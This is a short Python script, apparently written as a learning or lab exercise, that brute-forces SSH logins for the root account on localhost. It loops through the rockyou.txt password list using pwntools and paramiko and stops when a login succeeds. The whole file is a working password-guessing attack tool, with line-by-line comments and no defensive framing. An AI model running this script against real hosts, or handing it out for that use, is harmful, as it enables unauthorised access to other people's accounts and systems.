from pwn import *
import paramiko 

host = "127.0.0.1"
username = "root"
attempts = 0

with open("rockyou.txt", "r") as password_list: # Open a number of SSH passwords in read mode
    for password in password_list: # Use this to iterate over passwords in password list
        password = password.strip("\n") # Use this to strip the passwords and create a new line
        try: 
         print("[{}] Attempting password: '{}'!".format(attempts, password)) # The following will show the number of attempts, along with the password
         response = ssh(host=host, user=username, password=password, timeout=1) #Authentication attempt
         if response.connected(): #If the response has made a connection
            print("[>] Valid password found: '{}'!".format(password))
            response.close()
            break # Will break if password is found
         response.close() #If password is not correct it was close connection and try again
        except paramiko.ssh_exception.AuthenticationException: # If password is incorrect the following exception will be added
            print("[X] Invalid password!")
            attempts +=1 # Will add an additional counter to the attempts after every iteration. 
